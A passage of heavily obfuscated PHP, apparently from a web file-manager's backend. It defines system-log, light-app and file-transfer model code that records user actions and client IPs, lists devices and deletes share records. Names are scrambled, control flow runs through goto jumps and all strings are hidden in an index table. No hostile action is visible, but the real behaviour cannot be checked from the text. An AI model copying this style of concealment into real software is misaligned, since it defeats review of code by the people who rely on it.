"\173\151\x6f\x3a{$Aá©†ø¾‘}\x7d\57"; $AóÙÑÍÚĞ = !0; $fƒõŞæã®é = array(); goto F‚µ‚­œòØ; b“Ïƒšò: $F¬ãà£›¾ä = Model($A§‚Ë¯±­œ[430])->where($Cçêö˜ôö·)->sum($A§‚Ë¯±­œ[87]); $e¥…ì–‰Ó = $A§‚Ë¯±­œ[2381] . $EÍæÒŒ·ë; $d˜Ö ¡È = new TaskFileTransfer($e¥…ì–‰Ó, $A§‚Ë¯±­œ[2382], $f†ôî Àé, LNG($A§‚Ë¯±­œ[2383]) . "\50{$EÍæÒŒ·ë}\x29"); goto DæÃØ˜­•Ä; eÚ×¥Ã™Ì»: } public function progress($bÜ³°˜ğÛ) { return Task::get($_SERVER[¶ªÕß‚ØÁŸ][2381] . $bÜ³°˜ğÛ); } private function removeByFileID($eÎ†®ªìô˜ = array()) { goto AãÍ¿¸Æ¨Ë; c–’Õ›Üº: $fˆ÷„ß‚„½ = Model($E—ì˜Ï·İ¼[1121])->where($dÏÌ­ÀëŸ )->field($E—ì˜Ï·İ¼[377])->select(); if (!$fˆ÷„ß‚„½) { return; } $fˆ÷„ß‚„½ = array_to_keyvalue($fˆ÷„ß‚„½, $E—ì˜Ï·İ¼[33], $E—ì˜Ï·İ¼[377]); goto D°¿ÇŞ²Â; D°¿ÇŞ²Â: foreach ($fˆ÷„ß‚„½ as $eÁ†øÖéä–) { Model($E—ì˜Ï·İ¼[390])->removeNow($eÁ†øÖéä–, !1); } goto d×Ê¾Î©×‚; AãÍ¿¸Æ¨Ë: $E—ì˜Ï·İ¼ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($eÎ†®ªìô˜)) { return; } $dÏÌ­ÀëŸ  = array($E—ì˜Ï·İ¼[427] => array($E—ì˜Ï·İ¼[7], $eÎ†®ªìô˜)); goto c–’Õ›Üº; d×Ê¾Î©×‚: } private function removeShareItems($E¸ğ´¦ø) { goto AÒÇ¥µä; AÒÇ¥µä: $AÑš¿±²Çº =& $_SERVER[¶ªÕß‚ØÁŸ]; $D†¬È¬‘× = "\173\x69\157\72{$E¸ğ´¦ø}\175\x2f"; $E°Ûê²’“œ = array($AÑš¿±²Çº[377] => 0, $AÑš¿±²Çº[1022] => array($AÑš¿±²Çº[765], "{$D†¬È¬‘×}\x25")); goto E®¬ê»®›; E®¬ê»®›: $eÛí†÷Œ‹³ = Model($AÑš¿±²Çº[2084])->where($E°Ûê²’“œ)->field($AÑš¿±²Çº[449])->select(); if (empty($eÛí†÷Œ‹³)) { return; } $EÇìª„ô¶ = array_to_keyvalue($eÛí†÷Œ‹³, $AÑš¿±²Çº[33], $AÑš¿±²Çº[449]); goto eÏÙõ¨å™§; eÏÙõ¨å™§: Model($AÑš¿±²Çº[544])->remove($EÇìª„ô¶); goto e“ßî‘¼‰; e“ßî‘¼‰: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x4c\151\x67\150\164\x41\160\x70"; public $modelType = "\123\x79\163\164\145\x6d\117\x70\164\151\x6f\x6e"; public $field = array("\x6e\x61\x6d\x65", "\x67\x72\157\165\x70", "\144\145\x73\143", "\x63\157\x6e\164\145\x6e\164"); public function listData($A½Œ‡ˆ’ñ» = false, $cï•àë…´¡ = "\155\x6f\144\151\x66\171\x54\151\155\145", $c’ –’Œ¤¥ = true) { return parent::listData($A½Œ‡ˆ’ñ», $cï•àë…´¡, $c’ –’Œ¤¥); } public function remove($Eß£—°¶­†) { $Dìì‘Š…à = $this->findByName($Eß£—°¶­†); if (!$Dìì‘Š…à) { return !1; } return parent::remove($Dìì‘Š…à[$_SERVER[¶ªÕß‚ØÁŸ][375]]); } public function add($EÍ‚„š’İ¼) { if ($this->findByName($EÍ‚„š’İ¼[$_SERVER[¶ªÕß‚ØÁŸ][28]])) { return !1; } return parent::insert($EÍ‚„š’İ¼); } public function update($DÜÙ’„¤›, $D«Õ ’Éí) { $A­ÅÃõá =& $_SERVER[¶ªÕß‚ØÁŸ]; $eé¶ù»™¡Ë = $this->findByName($DÜÙ’„¤›); $bÜõïÃ‘Äô = $this->findByName($D«Õ ’Éí[$A­ÅÃõá[28]]); if (!$eé¶ù»™¡Ë || $bÜõïÃ‘Äô && $bÜõïÃ‘Äô[$A­ÅÃõá[375]] != $eé¶ù»™¡Ë[$A­ÅÃõá[375]]) { return !1; } return parent::update($eé¶ù»™¡Ë[$A­ÅÃõá[375]], $D«Õ ’Éí); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\137\154\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\x54\151\155\x65", "\x74\x69\155\x65", "\x69\156\x73\x65\162\x74", "\146\x75\156\x63\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $F»ƒôÓÈä² =& $_SERVER[¶ªÕß‚ØÁŸ]; return array($F»ƒôÓÈä²[2385] => LNG($F»ƒôÓÈä²[2386]), $F»ƒôÓÈä²[2387] => LNG($F»ƒôÓÈä²[2388]), $F»ƒôÓÈä²[2047] => LNG($F»ƒôÓÈä²[2389]), $F»ƒôÓÈä²[2390] => LNG($F»ƒôÓÈä²[2391]), $F»ƒôÓÈä²[2392] => LNG($F»ƒôÓÈä²[2393]), $F»ƒôÓÈä²[2394] => LNG($F»ƒôÓÈä²[2395]), $F»ƒôÓÈä²[2396] => LNG($F»ƒôÓÈä²[2397]), $F»ƒôÓÈä²[2398] => LNG($F»ƒôÓÈä²[2399]), $F»ƒôÓÈä²[2078] => LNG($F»ƒôÓÈä²[2400]), $F»ƒôÓÈä²[2079] => LNG($F»ƒôÓÈä²[2401]), $F»ƒôÓÈä²[2402] => LNG($F»ƒôÓÈä²[2403]), $F»ƒôÓÈä²[2404] => LNG($F»ƒôÓÈä²[2405]), $F»ƒôÓÈä²[2406] => LNG($F»ƒôÓÈä²[2407]), $F»ƒôÓÈä²[2408] => LNG($F»ƒôÓÈä²[2409]), $F»ƒôÓÈä²[2076] => LNG($F»ƒôÓÈä²[2410]), $F»ƒôÓÈä²[2082] => LNG($F»ƒôÓÈä²[2411]), $F»ƒôÓÈä²[2412] => LNG($F»ƒôÓÈä²[2413]), $F»ƒôÓÈä²[2414] => LNG($F»ƒôÓÈä²[2415]), $F»ƒôÓÈä²[2416] => LNG($F»ƒôÓÈä²[2417]), $F»ƒôÓÈä²[2418] => LNG($F»ƒôÓÈä²[2419]), $F»ƒôÓÈä²[2085] => LNG($F»ƒôÓÈä²[2420]), $F»ƒôÓÈä²[2086] => LNG($F»ƒôÓÈä²[2421]), $F»ƒôÓÈä²[2422] => LNG($F»ƒôÓÈä²[2423]), $F»ƒôÓÈä²[2424] => LNG($F»ƒôÓÈä²[2425]), $F»ƒôÓÈä²[2426] => LNG($F»ƒôÓÈä²[2427]), $F»ƒôÓÈä²[2428] => LNG($F»ƒôÓÈä²[2429]), $F»ƒôÓÈä²[2430] => LNG($F»ƒôÓÈä²[2431]), $F»ƒôÓÈä²[2080] => LNG($F»ƒôÓÈä²[2432]), $F»ƒôÓÈä²[2433] => LNG($F»ƒôÓÈä²[2434]), $F»ƒôÓÈä²[2435] => LNG($F»ƒôÓÈä²[2436]), $F»ƒôÓÈä²[2437] => LNG($F»ƒôÓÈä²[2437]), $F»ƒôÓÈä²[2438] => LNG($F»ƒôÓÈä²[2051]), $F»ƒôÓÈä²[2439] => LNG($F»ƒôÓÈä²[2440]), $F»ƒôÓÈä²[2441] => LNG($F»ƒôÓÈä²[2442]), $F»ƒôÓÈä²[2443] => LNG($F»ƒôÓÈä²[2444]), $F»ƒôÓÈä²[2445] => LNG($F»ƒôÓÈä²[2446]), $F»ƒôÓÈä²[2447] => LNG($F»ƒôÓÈä²[2448]), $F»ƒôÓÈä²[2449] => LNG($F»ƒôÓÈä²[2449]), $F»ƒôÓÈä²[2450] => LNG($F»ƒôÓÈä²[2451]), $F»ƒôÓÈä²[2452] => LNG($F»ƒôÓÈä²[2453]), $F»ƒôÓÈä²[2454] => LNG($F»ƒôÓÈä²[2455]), $F»ƒôÓÈä²[2456] => LNG($F»ƒôÓÈä²[2457]), $F»ƒôÓÈä²[2458] => LNG($F»ƒôÓÈä²[2459]), $F»ƒôÓÈä²[2460] => LNG($F»ƒôÓÈä²[2461])); } private function typeFile() { $e«­¨¹˜ˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D‡Ä¸‡Üœİ = array($e«­¨¹˜ˆ[2082] => array($e«­¨¹˜ˆ[2083]), $e«­¨¹˜ˆ[2406] => array($e«­¨¹˜ˆ[2462]), $e«­¨¹˜ˆ[2408] => array($e«­¨¹˜ˆ[2463]), $e«­¨¹˜ˆ[2076] => array($e«­¨¹˜ˆ[2077]), $e«­¨¹˜ˆ[2414] => array(), $e«­¨¹˜ˆ[2416] => array(), $e«­¨¹˜ˆ[2418] => array(), $e«­¨¹˜ˆ[2085] => array($e«­¨¹˜ˆ[2087]), $e«­¨¹˜ˆ[2086] => array($e«­¨¹˜ˆ[2087]), $e«­¨¹˜ˆ[2422] => array($e«­¨¹˜ˆ[2464]), $e«­¨¹˜ˆ[2424] => array($e«­¨¹˜ˆ[2464]), $e«­¨¹˜ˆ[2426] => array($e«­¨¹˜ˆ[2465]), $e«­¨¹˜ˆ[2412] => array($e«­¨¹˜ˆ[2466]), $e«­¨¹˜ˆ[2428] => array($e«­¨¹˜ˆ[2467]), $e«­¨¹˜ˆ[2430] => array($e«­¨¹˜ˆ[2468]), $e«­¨¹˜ˆ[2080] => array($e«­¨¹˜ˆ[2081])); return $D‡Ä¸‡Üœİ; } private function typeAll() { goto b¼å•çèÔï; f”™  äÃİ: foreach ($cïº™ƒ³° as $aÎîËƒ· => $BŞ•„´åÓ¿) { $B™èÉ Ù¯[$BŞ•„´åÓ¿[0]] = $B™èÉ Ù¯[$aÎîËƒ·]; } $B™èÉ Ù¯[$b†Œğ½í[2087]] = LNG($b†Œğ½í[2469]); $B™èÉ Ù¯[$b†Œğ½í[2464]] = LNG($b†Œğ½í[2470]); goto eº„¼§œ–£; eº„¼§œ–£: return $B™èÉ Ù¯; goto d›î‹â£İ»; b¼å•çèÔï: $b†Œğ½í =& $_SERVER[¶ªÕß‚ØÁŸ]; $B™èÉ Ù¯ = $this->typeList; $cïº™ƒ³° = array_filter($this->typeFile()); goto f”™  äÃİ; d›î‹â£İ»: } public function addLog($d¹Æ•Û‰¶Ê, $F®é¥ââ = array()) { goto bËÆ«Œ¦¾; bËÆ«Œ¦¾: $E‚ŠŞÉÑì™ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($this->typeList[$d¹Æ•Û‰¶Ê])) { return; } $FÀèªŒ¯” = USER_ID ? USER_ID : (isset($F®é¥ââ[$E‚ŠŞÉÑì™[1440]]) ? $F®é¥ââ[$E‚ŠŞÉÑì™[1440]] : 0); goto c·ÊÓ¹–÷Ç; B‚àÃ±¹Ï‰: parent::add($F®é¥ââ); goto a¾ÆÍàøÚ¨; c·ÊÓ¹–÷Ç: $dŒÙìª³§ô = get_client_ip(); if (!$F®é¥ââ || strlen(json_encode($F®é¥ââ)) >= 1024) { $F®é¥ââ = array($E‚ŠŞÉÑì™[2471] => $dŒÙìª³§ô); } else { if (is_array($F®é¥ââ)) { $F®é¥ââ[$E‚ŠŞÉÑì™[2471]] = $dŒÙìª³§ô; } else { $F®é¥ââ = array($E‚ŠŞÉÑì™[1038] => $F®é¥ââ, $E‚ŠŞÉÑì™[2471] => $dŒÙìª³§ô); } } $F®é¥ââ = array($E‚ŠŞÉÑì™[1430] => Session::sign(), $E‚ŠŞÉÑì™[1431] => $FÀèªŒ¯”, $E‚ŠŞÉÑì™[29] => $d¹Æ•Û‰¶Ê, $E‚ŠŞÉÑì™[1433] => json_encode($F®é¥ââ)); goto B‚àÃ±¹Ï‰; a¾ÆÍàøÚ¨: } public function remove($D–††°îì„) { $this->where(array($_SERVER[¶ªÕß‚ØÁŸ][393] => $D–††°îì„))->delete(); } private function _makeOrder($BŞÊ•¦öÍ˜ = '') { goto dŸ´ª‡á˜Û; bÈÛÁ¬ôù: $e¥îº¶× = Input::get($Eá‘²©õ£»[416], $Eá‘²©õ£»[7], $Eá‘²©õ£»[2245], array($Eá‘²©õ£»[2182], $Eá‘²©õ£»[412])); $e¥îº¶× = $a£–öŒ¨«Ü[$e¥îº¶×]; $BŞÊ•¦öÍ˜ = $BŞÊ•¦öÍ˜ . "{$c–…Ö±ÕÏì}\40{$e¥îº¶×}"; goto eØ¤ŒÄÏ³; eØ¤ŒÄÏ³: return $this->order($BŞÊ•¦öÍ˜); goto Aº®ì•²¶î; dŸ´ª‡á˜Û: $Eá‘²©õ£» =& $_SERVER[¶ªÕß‚ØÁŸ]; $c–…Ö±ÕÏì = $Eá‘²©õ£»[197]; $a£–öŒ¨«Ü = array($Eá‘²©õ£»[410] => $Eá‘²©õ£»[411], $Eá‘²©õ£»[412] => $Eá‘²©õ£»[413]); goto bÈÛÁ¬ôù; Aº®ì•²¶î: } public function get($F¥Úã›™‹µ = '') { goto C·Çç¨Ååá; bĞ¨Ìİëù: if ($F¥Úã›™‹µ[$eå’õ‘÷[1440]]) { $Eî•ŒàáæÚ[$eå’õ‘÷[1440]] = $F¥Úã›™‹µ[$eå’õ‘÷[1440]]; } if (isset($F¥Úã›™‹µ[$eå’õ‘÷[715]])) { $E„à†ã¹Öá = $F¥Úã›™‹µ[$eå’õ‘÷[715]]; $D¥â¨¹„‡¯ = isset($F¥Úã›™‹µ[$eå’õ‘÷[716]]) ? $F¥Úã›™‹µ[$eå’õ‘÷[716]] : time(); $Eî•ŒàáæÚ[$eå’õ‘÷[197]] = array($eå’õ‘÷[330], array($E„à†ã¹Öá, $D¥â¨¹„‡¯)); } if ($F¥Úã›™‹µ[$eå’õ‘÷[29]]) { $F´¦‰É ² = explode($eå’õ‘÷[47], $F¥Úã›™‹µ[$eå’õ‘÷[29]]); $c»˜‘¸ëØ = $this->typeFile(); $b÷È˜ƒè = array(); foreach ($F´¦‰É ² as $eôÕñª¬ùá) { $b÷È˜ƒè[] = $eôÕñª¬ùá; if (isset($c»˜‘¸ëØ[$eôÕñª¬ùá])) { $b÷È˜ƒè = array_merge($b÷È˜ƒè, $c»˜‘¸ëØ[$eôÕñª¬ùá]); } } $b÷È˜ƒè = array_unique($b÷È˜ƒè); if ($b÷È˜ƒè) { $Eî•ŒàáæÚ[$eå’õ‘÷[29]] = array($eå’õ‘÷[7], $b÷È˜ƒè); } } goto ašİÓ´Şíˆ; ašİÓ´Şíˆ: if (!empty($F¥Úã›™‹µ[$eå’õ‘÷[2471]])) { $Eî•ŒàáæÚ[$eå’õ‘÷[413]] = array($eå’õ‘÷[765], "\45{$F¥Úã›™‹µ[$eå’õ‘÷[2471]]}\x25"); } $cÓ†Õ°·© = $this->_makeOrder()->where($Eî•ŒàáæÚ)->selectPage(); if (empty($cÓ†Õ°·©[$eå’õ‘÷[363]])) { show_json(array(), !0, $cÓ†Õ°·©[$eå’õ‘÷[360]]); } goto eñ¤ÒöÀ; eñ¤ÒöÀ: $cÓ†Õ°·©[$eå’õ‘÷[363]] = $this->logList($cÓ†Õ°·©[$eå’õ‘÷[363]]); return $cÓ†Õ°·©; goto dî‘Š×ÅÀÌ; C·Çç¨Ååá: $eå’õ‘÷ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$F¥Úã›™‹µ) { show_json(array()); } $Eî•ŒàáæÚ = array(); goto bĞ¨Ìİëù; dî‘Š×ÅÀÌ: } private function ipAddress(&$FÚì‰Åá‘é) { $E‰÷Ú‚¬Â¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!empty($FÚì‰Åá‘é[$E‰÷Ú‚¬Â¤[2471]])) { $F‘ÁÇÙ±… = IpLocation::get($FÚì‰Åá‘é[$E‰÷Ú‚¬Â¤[2471]]); if ($F‘ÁÇÙ±… == $E‰÷Ú‚¬Â¤[2472]) { $F‘ÁÇÙ±… = $E‰÷Ú‚¬Â¤[2473]; } } else { $F‘ÁÇÙ±… = LNG($E‰÷Ú‚¬Â¤[2474]); } $FÚì‰Åá‘é[$E‰÷Ú‚¬Â¤[2475]] = $F‘ÁÇÙ±…; } private function descZipDownload($Bš½¸ƒìôÏ, &$AÕ£î’Ã®) { $eˆÃ×Ûàƒæ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($Bš½¸ƒìôÏ[$eˆÃ×Ûàƒæ[2476]])) { return; } $F££ÑÖÃÀ” = json_decode($Bš½¸ƒìôÏ[$eˆÃ×Ûàƒæ[2476]], !0); foreach ($F££ÑÖÃÀ” as $E—¬ĞÍàŠ±) { if (!IO::init($E—¬ĞÍàŠ±[$eˆÃ×Ûàƒæ[85]])) { continue; } if (!($bÉ¼ï†µÄ¯ = IO::infoFull($E—¬ĞÍàŠ±[$eˆÃ×Ûàƒæ[85]]))) { continue; } $Bš½¸ƒìôÏ[$eˆÃ×Ûàƒæ[85]] = $E—¬ĞÍàŠ±[$eˆÃ×Ûàƒæ[85]]; $AÕ£î’Ã®[] = $Bš½¸ƒìôÏ[$eˆÃ×Ûàƒæ[377]] = $bÉ¼ï†µÄ¯[$eˆÃ×Ûàƒæ[377]]; $AÕ£î’Ã®[] = $Bš½¸ƒìôÏ[$eˆÃ×Ûàƒæ[2288]] = $bÉ¼ï†µÄ¯[$eˆÃ×Ûàƒæ[469]]; break; } return $Bš½¸ƒìôÏ; } private function getSourceList(&$Eí§³íì« ) { $f±Ñƒ¯‡­ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÄšŠöÄÈ = array(); foreach ($Eí§³íì«  as $e…Í¯ÑøÛ => $b¤Ë±·¡¢) { goto EÚ‹Ü»ƒ½†; EÚ‹Ü»ƒ½†: $FÌ¼¿İñÛ  = json_decode($b¤Ë±·¡¢[$f±Ñƒ¯‡­[413]], !0); if ($b¤Ë±·¡¢[$f±Ñƒ¯‡­[29]] == $f±Ñƒ¯‡­[2079]) { $FÌ¼¿İñÛ  = $this->descZipDownload($FÌ¼¿İñÛ , $aÄšŠöÄÈ); $Eí§³íì« [$e…Í¯ÑøÛ][$f±Ñƒ¯‡­[413]] = json_encode($FÌ¼¿İñÛ ); continue; } if (strpos($b¤Ë±·¡¢[$f±Ñƒ¯‡­[29]], $f±Ñƒ¯‡­[2289]) !== 0) { goto E£µæÁïÅ; E£µæÁïÅ: if (!isset($FÌ¼¿İñÛ [$f±Ñƒ¯‡­[85]]) || strpos($b¤Ë±·¡¢[$f±Ñƒ¯‡­[29]], $f±Ñƒ¯‡­[2477]) !== 0) { continue; } if (!IO::init($FÌ¼¿İñÛ [$f±Ñƒ¯‡­[85]])) { continue; } if (!($a“ÙèùÄˆò = IO::infoFull($FÌ¼¿İñÛ [$f±Ñƒ¯‡­[85]]))) { continue; } goto bÔã¸ÙŒƒ¬; B¨ÃÀÁ¦‡Ù: continue; goto bÖÓ™—èØ; bÔã¸ÙŒƒ¬: $aÄšŠöÄÈ[] = $FÌ¼¿İñÛ [$f±Ñƒ¯‡­[377]] = $a“ÙèùÄˆò[$f±Ñƒ¯‡­[377]]; $aÄšŠöÄÈ[] = $FÌ¼¿İñÛ [$f±Ñƒ¯‡­[2288]] = $a“ÙèùÄˆò[$f±Ñƒ¯‡­[469]]; $Eí§³íì« [$e…Í¯ÑøÛ][$f±Ñƒ¯‡­[413]] = json_encode($FÌ¼¿İñÛ ); goto B¨ÃÀÁ¦‡Ù; bÖÓ™—èØ: } goto cŠ÷Ü’“—; cŠ÷Ü’“—: $aÄšŠöÄÈ[] = $FÌ¼¿İñÛ [$f±Ñƒ¯‡­[377]]; $aÄšŠöÄÈ[] = $FÌ¼¿İñÛ [$f±Ñƒ¯‡­[2288]]; if ($FÌ¼¿İñÛ [$f±Ñƒ¯‡­[29]] == $f±Ñƒ¯‡­[500]) { $aÄšŠöÄÈ[] = $FÌ¼¿İñÛ [$f±Ñƒ¯‡­[413]][$f±Ñƒ¯‡­[1010]]; $aÄšŠöÄÈ[] = $FÌ¼¿İñÛ [$f±Ñƒ¯‡­[413]][$f±Ñƒ¯‡­[1011]]; } goto Cö²‚¼È¼; Cö²‚¼È¼: if ($FÌ¼¿İñÛ [$f±Ñƒ¯‡­[29]] == $f±Ñƒ¯‡­[2296]) { $aÄšŠöÄÈ[] = $FÌ¼¿İñÛ [$f±Ñƒ¯‡­[413]][$f±Ñƒ¯‡­[377]]; } goto cêîÀç¨‡º; cêîÀç¨‡º: } if (!$aÄšŠöÄÈ) { return array(); } return Model($f±Ñƒ¯‡­[766])->sourceListInfo($aÄšŠöÄÈ, !0); } private function logList($B¨ç†¬“œØ) { goto BÜ—‹¾Ñµ; A’„»¶í“º: return $FÈº˜è—Éô; goto eòÄÓâÕ‚; BÜ—‹¾Ñµ: $E©™ éÂŒ¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a«±ÚÈºÌÓ = array_to_keyvalue($B¨ç†¬“œØ, $E©™ éÂŒ¤[33], $E©™ éÂŒ¤[1440]); $Bšˆ÷Æ°Ô˜ = Model($E©™ éÂŒ¤[485])->userListInfo(array_unique($a«±ÚÈºÌÓ)); goto A¥ÖË™Ù¦Ø; Dö¹¡ãÍ¡£: $Dé„‰¿¤æÅ = array(); foreach ($B¨ç†¬“œØ as $f©›™¦ƒÚ¢ => $C¤Û­¤ƒ“á) { goto d·‚›ˆÙ‰; eÄ¹áÓÓìº: $this->ipAddress($C¤Û­¤ƒ“á); if (strpos($dŞÈµÍò¿, $E©™ éÂŒ¤[2289]) === 0 || isset($a¥‰Ç÷º[$E©™ éÂŒ¤[2288]])) { goto bÜâÕ¼ô‚; B›š×®¯îß: if ($a¥‰Ç÷º[$E©™ éÂŒ¤[2301]] && $a¥‰Ç÷º[$E©™ éÂŒ¤[2301]][$E©™ éÂŒ¤[379]] == $E©™ éÂŒ¤[1084]) { $Dé„‰¿¤æÅ[] = $C¤Û­¤ƒ“á[$E©™ éÂŒ¤[375]]; unset($B¨ç†¬“œØ[$f©›™¦ƒÚ¢]); continue; } goto aë„Œ”Ÿ§; bÜâÕ¼ô‚: $a¥‰Ç÷º[$E©™ éÂŒ¤[399]] = $eó„ò†¹‘[$a¥‰Ç÷º[$E©™ éÂŒ¤[377]]]; $a¥‰Ç÷º[$E©™ éÂŒ¤[2301]] = $eó„ò†¹‘[$a¥‰Ç÷º[$E©™ éÂŒ¤[2288]]]; if ($a¥‰Ç÷º[$E©™ éÂŒ¤[29]] == $E©™ éÂŒ¤[500]) { $a¥‰Ç÷º[$E©™ éÂŒ¤[413]][$E©™ éÂŒ¤[1010]] = $eó„ò†¹‘[$a¥‰Ç÷º[$E©™ éÂŒ¤[413]][$E©™ éÂŒ¤[1010]]]; $a¥‰Ç÷º[$E©™ éÂŒ¤[413]][$E©™ éÂŒ¤[1011]] = $eó„ò†¹‘[$a¥‰Ç÷º[$E©™ éÂŒ¤[413]][$E©™ éÂŒ¤[1011]]]; } goto e¹İ¦’Ø¶ò; e¹İ¦’Ø¶ò: if ($a¥‰Ç÷º[$E©™ éÂŒ¤[29]] == $E©™ éÂŒ¤[2296]) { $a¥‰Ç÷º[$E©™ éÂŒ¤[413]][$E©™ éÂŒ¤[377]] = $eó„ò†¹‘[$a¥‰Ç÷º[$E©™ éÂŒ¤[413]][$E©™ éÂŒ¤[377]]]; } if ($a¥‰Ç÷º[$E©™ éÂŒ¤[29]] == $E©™ éÂŒ¤[2074]) { $a¥‰Ç÷º[$E©™ éÂŒ¤[2301]] = $a¥‰Ç÷º[$E©™ éÂŒ¤[399]]; $a¥‰Ç÷º[$E©™ éÂŒ¤[2288]] = $a¥‰Ç÷º[$E©™ éÂŒ¤[2301]][$E©™ éÂŒ¤[377]]; $a¥‰Ç÷º[$E©™ éÂŒ¤[399]] = !1; $a¥‰Ç÷º[$E©™ éÂŒ¤[377]] = $E©™ éÂŒ¤[33]; } if ($a¥‰Ç÷º[$E©™ éÂŒ¤[399]] && $a¥‰Ç÷º[$E©™ éÂŒ¤[399]][$E©™ éÂŒ¤[379]] == $E©™ éÂŒ¤[1084]) { $Dé„‰¿¤æÅ[] = $C¤Û­¤ƒ“á[$E©™ éÂŒ¤[375]]; unset($B¨ç†¬“œØ[$f©›™¦ƒÚ¢]); continue; } goto B›š×®¯îß; aë„Œ”Ÿ§: } $C¤Û­¤ƒ“á[$E©™ éÂŒ¤[413]] = $a¥‰Ç÷º; goto a¨¿ÏôæŞŞ; d÷ô½µÖò‘: $C¤Û­¤ƒ“á[$E©™ éÂŒ¤[28]] = isset($BªƒÉ¯”İ·[$E©™ éÂŒ¤[28]]) ? $BªƒÉ¯”İ·[$E©™ éÂŒ¤[28]] : LNG($E©™ éÂŒ¤[2474]); $C¤Û­¤ƒ“á[$E©™ éÂŒ¤[2336]] = isset($BªƒÉ¯”İ·[$E©™ éÂŒ¤[2336]]) ? $BªƒÉ¯”İ·[$E©™ éÂŒ¤[2336]] : $E©™ éÂŒ¤[33]; $C¤Û­¤ƒ“á[$E©™ éÂŒ¤[1346]] = isset($Cóª¿¿»¯[$dŞÈµÍò¿]) ? $Cóª¿¿»¯[$dŞÈµÍò¿] : $f–ÛÄ‡âÌñ; goto a»‰¹µ’á¢; a»‰¹µ’á¢: $C¤Û­¤ƒ“á[$E©™ éÂŒ¤[2244]] = $BªƒÉ¯”İ·; $a¥‰Ç÷º = json_decode($C¤Û­¤ƒ“á[$E©™ éÂŒ¤[413]], !0); $C¤Û­¤ƒ“á[$E©™ éÂŒ¤[2471]] = isset($a¥‰Ç÷º[$E©™ éÂŒ¤[2471]]) ? $a¥‰Ç÷º[$E©™ éÂŒ¤[2471]] : $E©™ éÂŒ¤[33]; goto eÄ¹áÓÓìº; d·‚›ˆÙ‰: $dŞÈµÍò¿ = $C¤Û­¤ƒ“á[$E©™ éÂŒ¤[29]]; $BªƒÉ¯”İ· = isset($Bšˆ÷Æ°Ô˜[$C¤Û­¤ƒ“á[$E©™ éÂŒ¤[1440]]]) ? $Bšˆ÷Æ°Ô˜[$C¤Û­¤ƒ“á[$E©™ éÂŒ¤[1440]]] : !1; $f–ÛÄ‡âÌñ = strpos($dŞÈµÍò¿, $E©™ éÂŒ¤[2478]) === 0 ? LNG($E©™ éÂŒ¤[2479]) : LNG($E©™ éÂŒ¤[2474]); goto d÷ô½µÖò‘; a¨¿ÏôæŞŞ: unset($C¤Û­¤ƒ“á[$E©™ éÂŒ¤[2480]]); $FÈº˜è—Éô[] = $C¤Û­¤ƒ“á; goto a»¼ñ¤çÇÁ; a»¼ñ¤çÇÁ: } $this->clearSystemPathLog($Dé„‰¿¤æÅ); goto A’„»¶í“º; A¥ÖË™Ù¦Ø: $eó„ò†¹‘ = $this->getSourceList($B¨ç†¬“œØ); $Cóª¿¿»¯ = $this->typeAll(); $FÈº˜è—Éô = array(); goto Dö¹¡ãÍ¡£; eòÄÓâÕ‚: } private function clearSystemPathLog($CÈç“ÙµŸ) { $f´‹„ï®é =& $_SERVER[¶ªÕß‚ØÁŸ]; if (count($CÈç“ÙµŸ) == 0) { return; } $EÀ®„ƒŒ‡ = array($f´‹„ï®é[375] => array($f´‹„ï®é[7], array_unique($CÈç“ÙµŸ))); $this->where($EÀ®„ƒŒ‡)->delete(); } public function deviceList($BëÊÖ“¯®İ, $AğæµË«² = 0) { $Eì©çÌâ·Í =& $_SERVER[¶ªÕß‚ØÁŸ]; $B•ˆÒïÖŠ§ = array($Eì©çÌâ·Í[1440] => $BëÊÖ“¯®İ, $Eì©çÌâ·Í[197] => array($Eì©çÌâ·Í[934], $AğæµË«²), $Eì©çÌâ·Í[29] => $Eì©çÌâ·Í[2047]); $C©…áø„ëµ = array(); $A†áõíá¸ì = $this->field($Eì©çÌâ·Í[2481])->where($B•ˆÒïÖŠ§)->order($Eì©çÌâ·Í[2299])->limit(50)->select(); foreach ($A†áõíá¸ì as $AÓÃ©â‘À« => $E¿ß’®«Ô) { goto c£‹‘Â»ŸÔ; c£‹‘Â»ŸÔ: if ($AÓÃ©â‘À« > 0 && abs($E¿ß’®«Ô[$Eì©çÌâ·Í[197]] - $A†áõíá¸ì[$AÓÃ©â‘À« - 1][$Eì©çÌâ·Í[197]]) < 5) { continue; } $d’¼¯ëĞŸ = json_decode($E¿ß’®«Ô[$Eì©çÌâ·Í[413]], !0); $E¿ß’®«Ô[$Eì©çÌâ·Í[2471]] = isset($d’¼¯ëĞŸ[$Eì©çÌâ·Í[2471]]) ? $d’¼¯ëĞŸ[$Eì©çÌâ·Í[2471]] : $Eì©çÌâ·Í[33]; goto FŞëš‰ÔßÕ; FŞëš‰ÔßÕ: unset($d’¼¯ëĞŸ[$Eì©çÌâ·Í[2471]]); $b¹‘ŞÈ…ˆÉ = $this->deviceType($d’¼¯ëĞŸ[$Eì©çÌâ·Í[2290]]); if (isset($C©…áø„ëµ[$b¹‘ŞÈ…ˆÉ])) { continue; } goto AñÒÃÜŒ¢Î; AñÒÃÜŒ¢Î: $this->ipAddress($E¿ß’®«Ô); $E¿ß’®«Ô[$Eì©çÌâ·Í[413]] = $d’¼¯ëĞŸ; $C©…áø„ëµ[$b¹‘ŞÈ…ˆÉ] = $E¿ß’®«Ô; goto B§¼æ‹ÕÆ…; B§¼æ‹ÕÆ…: } return array_values($C©…áø„ëµ); } public function deviceType($d¬¿æ†È¨Æ) { return $d¬¿æ†È¨Æ; } } goto AÆŸõ‘–»; Bçó§Å®ŞÉ: define($_SERVER[¶ªÕß‚ØÁŸ][1941], 32); class Services_JSON { function __construct($B…ã™Œå±ß = 0) { $this->use = $B…ã™Œå±ß; } function utf162utf8($eŸ“ÊôãÈ¶) { $cÃ·ÛÃô¸¡ =& 